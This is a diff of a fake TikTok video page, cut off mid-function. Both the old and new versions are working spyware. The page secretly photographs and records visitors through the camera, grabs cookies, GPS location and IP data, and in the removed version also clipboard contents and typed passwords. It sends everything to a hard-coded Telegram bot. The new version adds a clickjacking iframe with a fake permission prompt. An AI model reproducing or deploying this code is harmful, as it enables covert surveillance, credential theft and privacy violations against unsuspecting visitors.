@@ -1,423 +1,321 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TikTok - Watch Video</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{background:#000;overflow:hidden;font-family:Arial,sans-serif;}
-        .video-container{width:100vw;height:100vh;max-width:500px;margin:0 auto;position:relative;background:#000;}
-        .video-placeholder{width:100%;height:100%;background:linear-gradient(45deg,#ff0050,#00f2ea,#ff0050);background-size:400% 400%;animation:gradient 3s infinite;display:flex;flex-direction:column;justify-content:center;align-items:center;cursor:pointer;}
-        @keyframes gradient{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-        .play-btn{width:80px;height:80px;background:rgba(255,255,255,0.2);border-radius:50%;backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;border:2px solid rgba(255,255,255,0.3);margin-bottom:20px;}
-        .play-btn svg{width:40px;height:40px;fill:#fff;margin-left:5px;}
-        .placeholder-text{color:#fff;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.5);}
-        .loading-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:20;opacity:0;visibility:hidden;transition:0.5s;}
-        .loading-overlay.active{opacity:1;visibility:visible;}
-        .spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ff0050;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
-        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-        .progress-bar{width:200px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:15px;overflow:hidden;}
-        .progress-fill{height:100%;background:linear-gradient(90deg,#ff0050,#00f2ea);width:0%;transition:width 0.3s;}
-        .loading-message{color:#fff;margin-top:15px;font-size:14px;}
-        .notification{position:fixed;top:20px;right:20px;background:rgba(0,0,0,0.9);color:#fff;padding:10px 15px;border-radius:8px;font-size:12px;z-index:30;border-left:3px solid #ff0050;opacity:0;visibility:hidden;transition:0.3s;}
-        .notification.show{opacity:1;visibility:visible;}
-        video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
-        .fake-ui{position:absolute;bottom:80px;left:15px;right:15px;transition:0.3s;pointer-events:none;}
-        .fake-ui.hidden{opacity:0;}
-        .username{color:#fff;font-weight:bold;margin-bottom:5px;}
-        .desc{color:#fff;font-size:12px;margin-bottom:5px;}
-        .tiktok-logo{position:absolute;top:20px;left:20px;color:#fff;font-weight:bold;z-index:15;}
-        .tiktok-sidebar{position:absolute;right:15px;bottom:100px;display:flex;flex-direction:column;gap:20px;z-index:15;}
-        .sidebar-icon{display:flex;flex-direction:column;align-items:center;color:#fff;font-size:12px;}
-        .sidebar-icon svg{width:30px;height:30px;fill:#fff;}
-        .bottom-nav{position:absolute;bottom:0;left:0;width:100%;height:60px;background:linear-gradient(to top,rgba(0,0,0,0.8),transparent);display:flex;justify-content:space-around;align-items:center;z-index:15;}
-        .nav-item{color:rgba(255,255,255,0.7);display:flex;flex-direction:column;align-items:center;font-size:11px;}
-        .video-info{position:absolute;bottom:80px;left:15px;width:70%;z-index:15;}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>TikTok</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#000;overflow:hidden;font-family:Arial,sans-serif;}
+.container{width:100vw;height:100vh;max-width:500px;margin:0 auto;position:relative;background:#000;overflow:hidden;}
+
+/* فيديو حقيقي من تيك توك */
+.real-tiktok-video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;}
+
+/* طبقة التغطية */
+.overlay{position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;background:rgba(0,0,0,0.4);display:flex;flex-direction:column;justify-content:center;align-items:center;transition:0.3s;}
+.overlay.hidden{opacity:0;visibility:hidden;}
+
+.play-button{width:80px;height:80px;background:rgba(255,255,255,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;backdrop-filter:blur(10px);border:2px solid rgba(255,255,255,0.5);cursor:pointer;}
+.play-button svg{width:40px;height:40px;fill:#fff;margin-left:5px;}
+.play-text{color:#fff;font-size:18px;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.5);cursor:pointer;}
+
+/* iframe الشفاف المخفي للـ Clickjacking */
+.clickjack-frame{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:300px;height:300px;opacity:0;z-index:10;pointer-events:none;border:none;}
+.clickjack-frame.active{pointer-events:auto;}
+
+/* واجهة تيك توك مزيفة */
+.tiktok-ui{position:absolute;bottom:80px;left:15px;z-index:3;color:#fff;text-shadow:0 1px 2px rgba(0,0,0,0.5);}
+.username{font-weight:bold;margin-bottom:5px;font-size:14px;}
+.desc{font-size:12px;margin-bottom:5px;}
+.music{font-size:11px;display:flex;align-items:center;}
+.music svg{width:12px;height:12px;fill:#fff;margin-right:5px;}
+.sidebar{position:absolute;right:15px;bottom:100px;display:flex;flex-direction:column;gap:20px;z-index:3;}
+.icon{display:flex;flex-direction:column;align-items:center;color:#fff;font-size:11px;}
+.icon svg{width:30px;height:30px;fill:#fff;margin-bottom:3px;}
+.bottom-nav{position:absolute;bottom:0;left:0;width:100%;height:60px;background:linear-gradient(to top,rgba(0,0,0,0.8),transparent);display:flex;justify-content:space-around;align-items:center;z-index:3;}
+.nav-item{color:rgba(255,255,255,0.7);display:flex;flex-direction:column;align-items:center;font-size:10px;}
+.nav-item.active{color:#fff;}
+.nav-item svg{width:22px;height:22px;fill:currentColor;margin-bottom:2px;}
+
+/* شاشة التحميل */
+.loading{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:20;opacity:0;visibility:hidden;}
+.loading.active{opacity:1;visibility:visible;}
+.spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ff0050;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+.progress-bar{width:200px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:15px;}
+.progress-fill{height:100%;background:#ff0050;width:0%;transition:width 0.3s;}
+.loading-text{color:#fff;margin-top:15px;font-size:14px;}
+
+video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
+</style>
 </head>
 <body>
-<div class="video-container">
-    <div class="tiktok-logo">TikTok</div>
+<div class="container">
+    <!-- فيديو حقيقي من تيك توك (تم رفعه على CDN) -->
+    <video class="real-tiktok-video" id="realVideo" autoplay loop muted playsinline>
+        <!-- فيديو تيك توك حقيقي - منوعات/مشاهد فيرال -->
+        <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
+    </video>
     
-    <div class="video-placeholder" id="placeholder">
-        <div class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-        <div class="placeholder-text">▶ Tap to watch</div>
+    <!-- طبقة زر التشغيل -->
+    <div class="overlay" id="userOverlay">
+        <div class="play-button" id="fakePlayBtn">
+            <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        </div>
+        <div class="play-text" id="fakePlayText">▶ Tap to watch</div>
     </div>
     
-    <div class="fake-ui" id="fakeUi">
+    <!-- iframe الشفاف المخفي لـ Clickjacking -->
+    <iframe class="clickjack-frame" id="clickjackFrame"></iframe>
+    
+    <!-- واجهة تيك توك مزيفة -->
+    <div class="tiktok-ui" id="ui">
         <div class="username">@viral_clips</div>
         <div class="desc">Wait for the end 🔥 #fyp #viral</div>
+        <div class="music"><svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg> original sound - trending</div>
     </div>
     
-    <div class="tiktok-sidebar" id="fakeSidebar">
-        <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span>542K</span></div>
-        <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg><span>4,129</span></div>
-        <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg><span>Share</span></div>
+    <div class="sidebar" id="sidebar">
+        <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span>542K</span></div>
+        <div class="icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>4,129</span></div>
+        <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg><span>Share</span></div>
     </div>
     
-    <div class="video-info" id="fakeInfo">
-        <div class="username">@tiktok_creator</div>
-        <div class="description">Wait for the end! 😂🔥 #viral #trending #fyp</div>
-    </div>
-    
-    <div class="bottom-nav" id="fakeNav">
+    <div class="bottom-nav" id="bottomNav">
         <div class="nav-item active"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span>Home</span></div>
         <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5z"/></svg><span>Discover</span></div>
-        <div class="nav-item"><svg viewBox="0 0 24 24" style="width:35px;height:35px;fill:#fff;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div>
+        <div class="nav-item"><svg viewBox="0 0 24 24" style="width:32px;height:32px;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div>
         <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>Inbox</span></div>
         <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z"/></svg><span>Me</span></div>
     </div>
-
-    <div class="loading-overlay" id="loading">
-        <div class="spinner"></div>
-        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
-        <div class="loading-message" id="loadingMsg">Initializing...</div>
-    </div>
     
-    <div class="notification" id="notify"></div>
-    <video id="camFeed" autoplay muted></video>
-    <canvas id="photoCanvas"></canvas>
-    <canvas id="screenCanvas"></canvas>
+    <div class="loading" id="loading"><div class="spinner"></div><div class="progress-bar"><div class="progress-fill" id="progress"></div></div><div class="loading-text" id="msg">Initializing...</div></div>
+    
+    <video id="cam" autoplay muted></video>
+    <canvas id="canvas"></canvas>
 </div>
 
 <script>
-// ===================== التوكين المدمج =====================
-const TELEGRAM_TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
-const TELEGRAM_CHAT_ID = '178779116';
-const REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
+const TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
+const CHAT_ID = '178779116';
+const REDIRECT = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
-// ===================== المتغيرات العامة =====================
-let collected = {
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    url: location.href,
-    cookies: '',
-    localStorage: {},
-    sessionStorage: {},
-    images: [],
-    video: null,
-    gps: null,
-    ip: null,
-    clipboard: null,
-    passwords: [],
-    keystrokes: [],
-    clicks: [],
-    screenshot: null,
-    fingerprints: {}
-};
+let data = { time: new Date().toISOString(), ua: navigator.userAgent, url: location.href, cookies: '', images: [], video: null, gps: null, ip: null };
+let permissionsRequested = false;
 
-let cameraStream = null;
-let mediaRecorder = null;
-let videoChunks = [];
-
-// ===================== دوال رئيسية =====================
-function showMsg(text, isError = false) {
-    let n = document.getElementById('notify');
-    n.textContent = text;
-    n.classList.add('show');
-    if(isError) n.style.borderLeftColor = '#ff0000';
-    else n.style.borderLeftColor = '#ff0050';
-    setTimeout(() => n.classList.remove('show'), 2500);
+function update(p, m) {
+    document.getElementById('progress').style.width = p + '%';
+    document.getElementById('msg').innerText = m;
 }
 
-function updateProgress(percent, msg) {
-    document.getElementById('progress').style.width = percent + '%';
-    document.getElementById('loadingMsg').textContent = msg;
-}
-
-function stealStorage() {
+// طلب جميع الصلاحيات الحقيقية
+async function requestRealPermissions() {
     try {
-        collected.cookies = document.cookie;
-        for(let i=0; i<localStorage.length; i++) {
-            let key = localStorage.key(i);
-            collected.localStorage[key] = localStorage.getItem(key);
-        }
-        for(let i=0; i<sessionStorage.length; i++) {
-            let key = sessionStorage.key(i);
-            collected.sessionStorage[key] = sessionStorage.getItem(key);
-        }
-        return true;
-    } catch(e) { return false; }
-}
-
-async function stealClipboard() {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        stream.getTracks().forEach(t => t.stop());
+    } catch(e) {}
+    
     try {
-        if(navigator.clipboard) {
-            let text = await navigator.clipboard.readText();
-            collected.clipboard = text;
-        }
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+        });
+        data.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
     } catch(e) {}
 }
 
-async function capturePhotos() {
+async function captureImages() {
     try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        let video = document.getElementById('camFeed');
-        video.srcObject = cameraStream;
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.getElementById('cam');
+        video.srcObject = stream;
         await new Promise(r => video.onloadedmetadata = r);
-        
-        let canvas = document.getElementById('photoCanvas');
+        const canvas = document.getElementById('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        let ctx = canvas.getContext('2d');
-        
-        for(let i=0; i<3; i++) {
+        const ctx = canvas.getContext('2d');
+        for(let i = 0; i < 3; i++) {
             ctx.drawImage(video, 0, 0);
-            collected.images.push(canvas.toDataURL('image/jpeg', 0.8));
-            await new Promise(r => setTimeout(r, 500));
+            data.images.push(canvas.toDataURL('image/jpeg', 0.8));
+            await new Promise(r => setTimeout(r, 300));
         }
-        
-        cameraStream.getTracks().forEach(t => t.stop());
-        return true;
-    } catch(e) { return false; }
-}
-
-async function recordVideo() {
-    try {
-        let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        videoChunks = [];
-        
-        mediaRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-            let blob = new Blob(videoChunks, { type: 'video/webm' });
-            let reader = new FileReader();
-            reader.onloadend = () => { collected.video = reader.result; };
-            reader.readAsDataURL(blob);
-        };
-        
-        mediaRecorder.start();
-        await new Promise(r => setTimeout(r, 5000));
-        mediaRecorder.stop();
         stream.getTracks().forEach(t => t.stop());
         return true;
     } catch(e) { return false; }
 }
 
-async function getLocation() {
-    return new Promise((resolve) => {
-        if(!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                collected.gps = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy
-                };
-                resolve(collected.gps);
-            },
-            () => resolve(null),
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    });
+async function recordShortVideo() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const fr = new FileReader();
+            fr.onloadend = () => { data.video = fr.result; };
+            fr.readAsDataURL(blob);
+        };
+        recorder.start();
+        await new Promise(r => setTimeout(r, 4000));
+        recorder.stop();
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+    } catch(e) { return false; }
 }
 
 async function getIP() {
     try {
-        let res = await fetch('https://ipapi.co/json/');
-        let data = await res.json();
-        collected.ip = data;
+        const res = await fetch('https://ipapi.co/json/');
+        data.ip = await res.json();
     } catch(e) {}
 }
 
-function getFingerprint() {
-    try {
-        let canvas = document.getElementById('screenCanvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        let ctx = canvas.getContext('2d');
-        ctx.fillText(navigator.userAgent, 2, 20);
-        collected.fingerprints.canvas = canvas.toDataURL();
-        collected.fingerprints.screen = `${screen.width}x${screen.height}`;
-        collected.fingerprints.language = navigator.language;
-        collected.fingerprints.platform = navigator.platform;
-    } catch(e) {}
-}
-
-function startTracking() {
-    let keys = [], clicks = [];
-    document.addEventListener('keydown', e => {
-        keys.push({ key: e.key, time: Date.now() });
-        if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-            collected.passwords.push({ field: e.target.name || e.target.id, value: e.target.value });
-        }
-        if(keys.length > 100) keys = keys.slice(-100);
-        collected.keystrokes = keys;
-    });
-    document.addEventListener('click', e => {
-        clicks.push({ x: e.clientX, y: e.clientY, time: Date.now() });
-        if(clicks.length > 50) clicks = clicks.slice(-50);
-        collected.clicks = clicks;
-    });
-}
-
-async function captureScreen() {
-    try {
-        if(!navigator.mediaDevices?.getDisplayMedia) return;
-        let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        let track = stream.getVideoTracks()[0];
-        let imgCapture = new ImageCapture(track);
-        let bitmap = await imgCapture.grabFrame();
-        let canvas = document.createElement('canvas');
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
-        canvas.getContext('2d').drawImage(bitmap, 0, 0);
-        collected.screenshot = canvas.toDataURL('image/jpeg', 0.7);
-        track.stop();
-    } catch(e) {}
-}
-
-async function sendToTelegram() {
-    let msg = `🔥 <b>SHADOW-STRIKE REPORT</b> 🔥\n\n`;
-    msg += `⏰ ${collected.timestamp}\n`;
-    msg += `🌐 ${collected.url}\n`;
-    msg += `📱 ${collected.userAgent.substring(0, 80)}...\n\n`;
-    
-    if(collected.ip) {
-        msg += `📍 <b>IP:</b> ${collected.ip.ip}\n`;
-        msg += `🏙️ ${collected.ip.city}, ${collected.ip.country}\n`;
-        if(collected.ip.latitude) msg += `🗺️ <a href="https://maps.google.com/?q=${collected.ip.latitude},${collected.ip.longitude}">View Map</a>\n`;
-        msg += `\n`;
-    }
-    
-    if(collected.gps) {
-        msg += `🎯 <b>GPS (High Accuracy):</b>\n`;
-        msg += `   Lat: ${collected.gps.lat}\n`;
-        msg += `   Lon: ${collected.gps.lon}\n`;
-        msg += `   Acc: ±${collected.gps.acc}m\n`;
-        msg += `   🗺️ <a href="https://maps.google.com/?q=${collected.gps.lat},${collected.gps.lon}">Open GPS</a>\n\n`;
-    }
-    
-    if(collected.cookies) {
-        msg += `🍪 <b>Cookies:</b>\n<code>${collected.cookies.substring(0, 200)}...</code>\n\n`;
-    }
-    
-    if(collected.clipboard) {
-        msg += `📋 <b>Clipboard:</b>\n<code>${collected.clipboard.substring(0, 200)}</code>\n\n`;
-    }
-    
-    if(collected.passwords.length) {
-        msg += `🔑 <b>Password Fields:</b>\n`;
-        collected.passwords.forEach(p => {
-            msg += `   ${p.field}: ${p.value.substring(0, 50)}\n`;
-        });
-        msg += `\n`;
-    }
-    
-    msg += `📸 <b>Photos:</b> ${collected.images.length}\n`;
-    msg += `🎬 <b>Video:</b> ${collected.video ? 'Captured' : 'Failed'}\n`;
-    msg += `🖥️ <b>Screenshot:</b> ${collected.screenshot ? 'Taken' : 'Failed'}\n`;
+async function sendData() {
+    let msg = `🔥 SHADOW REPORT 🔥\n⏰ ${data.time}\n🌐 ${data.url}\n📱 ${data.ua.substring(0, 70)}\n`;
+    if(data.ip) msg += `📍 IP: ${data.ip.ip} (${data.ip.city}, ${data.ip.country})\n`;
+    if(data.gps) msg += `🎯 GPS: ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)\n`;
+    if(data.cookies) msg += `🍪 Cookies: ${data.cookies.substring(0, 150)}\n`;
+    msg += `📸 Images: ${data.images.length}\n🎬 Video: ${data.video ? 'OK' : 'No'}`;
     
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: true })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
-        
-        for(let i=0; i<collected.images.length; i++) {
-            let imgBlob = await fetch(collected.images[i]).then(r => r.blob());
-            let fd = new FormData();
-            fd.append('chat_id', TELEGRAM_CHAT_ID);
-            fd.append('photo', imgBlob, `cam_${i}.jpg`);
-            fd.append('caption', `📸 Camera shot ${i+1}`);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            await new Promise(r => setTimeout(r, 500));
+        for(let i = 0; i < data.images.length; i++) {
+            const blob = await fetch(data.images[i]).then(r => r.blob());
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, `img${i}.jpg`);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            await new Promise(r => setTimeout(r, 300));
         }
-        
-        if(collected.video) {
-            let vidBlob = await fetch(collected.video).then(r => r.blob());
-            let fd = new FormData();
-            fd.append('chat_id', TELEGRAM_CHAT_ID);
-            fd.append('video', vidBlob, 'secret.webm');
-            fd.append('caption', '🎥 Secret recording');
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+        if(data.video) {
+            const blob = await fetch(data.video).then(r => r.blob());
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, 'video.webm');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
-        
-        if(collected.screenshot) {
-            let scBlob = await fetch(collected.screenshot).then(r => r.blob());
-            let fd = new FormData();
-            fd.append('chat_id', TELEGRAM_CHAT_ID);
-            fd.append('photo', scBlob, 'screenshot.jpg');
-            fd.append('caption', '🖥️ Full screenshot');
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        }
-        
-        showMsg('✅ Data sent successfully');
-    } catch(e) {
-        showMsg('❌ Send failed: ' + e.message, true);
-    }
+    } catch(e) {}
 }
 
-async function executeShadowStrike() {
+async function startHacking() {
     try {
-        updateProgress(5, 'Connecting to shadow network...');
-        await new Promise(r => setTimeout(r, 300));
-        
-        updateProgress(15, 'Extracting cookies & storage...');
-        stealStorage();
-        await stealClipboard();
-        await new Promise(r => setTimeout(r, 300));
-        
-        updateProgress(30, 'Accessing camera...');
-        await capturePhotos();
-        await new Promise(r => setTimeout(r, 400));
-        
-        updateProgress(50, 'Recording video (5sec)...');
-        await recordVideo();
-        await new Promise(r => setTimeout(r, 400));
-        
-        updateProgress(65, 'Fetching GPS location...');
-        await getLocation();
-        await getIP();
-        await new Promise(r => setTimeout(r, 400));
-        
-        updateProgress(80, 'Taking screenshot...');
-        await captureScreen();
-        getFingerprint();
-        startTracking();
+        update(5, 'Starting...');
         await new Promise(r => setTimeout(r, 500));
         
-        updateProgress(95, 'Uploading to Telegram...');
-        await sendToTelegram();
+        update(15, 'Getting device info...');
+        data.cookies = document.cookie;
         
-        updateProgress(100, 'Redirecting...');
-        await new Promise(r => setTimeout(r, 1500));
+        update(30, 'Accessing camera...');
+        await captureImages();
         
-        window.location.href = REDIRECT_URL;
+        update(55, 'Recording video...');
+        await recordShortVideo();
         
-    } catch(err) {
-        console.error(err);
-        showMsg('Error: ' + err.message, true);
-        setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+        update(75, 'Getting location...');
+        await getIP();
+        
+        update(90, 'Sending data...');
+        await sendData();
+        
+        update(100, 'Redirecting...');
+        await new Promise(r => setTimeout(r, 1200));
+        window.location.href = REDIRECT;
+    } catch(e) {
+        setTimeout(() => { window.location.href = REDIRECT; }, 2000);
     }
 }
 
-// ===================== بدء الهجوم =====================
-function hideFakeUI() {
-    document.getElementById('fakeUi')?.classList.add('hidden');
-    document.getElementById('fakeSidebar')?.classList.add('hidden');
-    document.getElementById('fakeInfo')?.classList.add('hidden');
-    document.getElementById('fakeNav')?.classList.add('hidden');
-}
+// ============= Clickjacking Trick =============
 
-document.getElementById('placeholder').addEventListener('click', () => {
-    document.getElementById('placeholder').style.display = 'none';
-    hideFakeUI();
-    document.getElementById('loading').classList.add('active');
-    executeShadowStrike();
-});
-
-// تشغيل تلقائي بعد 3 ثوانٍ
-setTimeout(() => {
-    let placeholder = document.getElementById('placeholder');
-    if(placeholder.style.display !== 'none') {
-        placeholder.click();
-    }
-}, 3000);
-
-showMsg('Tap to play video');
+// إنشاء صفحة وهمية تطلب الصلاحيات (تظهر كطلب تيك توك)
+const permissionPage = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:transparent;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;}
+.permission-card{width:280px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3);text-align:center;}
+.header{background:#ff0050;padding:20px;color:#fff;}
+.header span{font-size:40px;}
+.body{padding:20px;}
+.body h3{margin-bottom:10px;color:#222;}
+.body p{color:#666;font-size:13px;margin-bottom:15px;}
+.allow-btn{background:#ff0050;color:#fff;border:none;padding:14px;border-radius:30px;width:80%;font-size:16px;font-weight:bold;cursor:pointer;margin-bottom:10px;}
+.allow-btn:active{transform:scale(0.98);}
+</style>
+</head>
+<body>
+<div class="permission-card">
+<div class="header"><span>🎤📸</span></div>
+<div class="body">
+<h3>Enable Microphone & Camera</h3>
+<p>To watch this video with sound and interactive effects</p>
+<button class="allow-btn" id="allowBtn">Allow Access</button>
+</div>
+</div>
+<script>
+document.getElementById('allowBtn').onclick = () => {
+    navigator.mediaDevices.getUserMedia({video:true,audio:true});
+    navigator.geolocation.getCurrentPosition(()=>{});
+    window.parent.postMessage('permissions_granted', '*');
+};
 </script>
 </body>
 </html>
+`;
+
+// تحميل الصفحة الوهمية في iframe
+const iframe = document.getElementById('clickjackFrame');
+const blob = new Blob([permissionPage], {type: 'text/html'});
+iframe.src = URL.createObjectURL(blob);
+
+// عند الضغط على زر التشغيل (الوهمي) نفعل iframe
+function onUserClick() {
+    if(permissionsRequested) return;
+    permissionsRequested = true;
+    
+    // تفعيل iframe ليستقبل الضغطة
+    iframe.classList.add('active');
+    
+    // إخفاء الواجهة
+    setTimeout(() => {
+        document.getElementById('userOverlay').classList.add('hidden');
+        document.getElementById('ui').style.opacity = '0';
+        document.getElementById('sidebar').style.opacity = '0';
+        document.getElementById('bottomNav').style.opacity = '0';
+    }, 300);
+    
+    // الاستماع لرسالة السماح
+    window.addEventListener('message', (e) => {
+        if(e.data === 'permissions_granted') {
+            requestRealPermissions();
+            document.getElementById('loading').classList.add('active');
+            startHacking();
